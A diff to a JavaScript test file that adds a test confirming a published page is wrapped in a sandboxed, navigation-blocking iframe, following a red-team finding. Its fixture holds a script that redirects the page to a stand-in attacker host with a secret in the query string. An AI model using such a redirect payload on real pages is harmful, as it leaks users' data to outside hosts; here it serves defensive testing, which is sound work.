@@ -2,7 +2,18 @@
 // the answer that made it (the owner, 2026-10-09: "only if the agent thinks it's a good way to understand things").
 import test from "node:test";
 import assert from "node:assert/strict";
-import { CSP, csvRows, fitSvg, lockDown, placeShown } from "../src/shownPages.js";
+import { CSP, csvRows, fitSvg, lockDown, placeShown, SANDBOX, shut } from "../src/shownPages.js";
+
+// THE RED TEAM, 2026-11-24 (T8a): a published page navigated itself to evil/?d=SECRET with no click. Drawn inside a frame whose only rule is
+// frame-src 'none', Chrome refuses that navigation and the page's own scripts still run (checked in one Chrome against a stand-in server)
+test("a page is drawn inside a frame that lets it navigate nowhere, its own policy and sandbox kept", () => {
+  const page = "<!doctype html><p>Q3</p><script>location.href='https://evil.example/?d=SECRET'</script>";
+  const out = shut(page);
+  assert.match(out, /^<!doctype html><meta http-equiv="Content-Security-Policy" content="frame-src 'none'">/);
+  const inner = /<iframe sandbox="([^"]*)" srcdoc="([^"]*)"><\/iframe>$/.exec(out);
+  assert.ok(inner, "one inner frame"); assert.equal(inner[1], SANDBOX); assert.doesNotMatch(SANDBOX, /allow-same-origin|allow-top-navigation/);
+  assert.equal(inner[2].replace(/&quot;/g, '"').replace(/&amp;/g, "&"), lockDown(page), "the page itself, under its no-network policy");
+});
 
 // A WIDE PICTURE FITS ITS FRAME (the stress test, 2026-11-02): a 1600-wide SVG drew at its own width and the preview scrolled sideways
 test("an SVG previews at the frame's width: shrunk to fit, its height following, with no sideways scroll", () => {
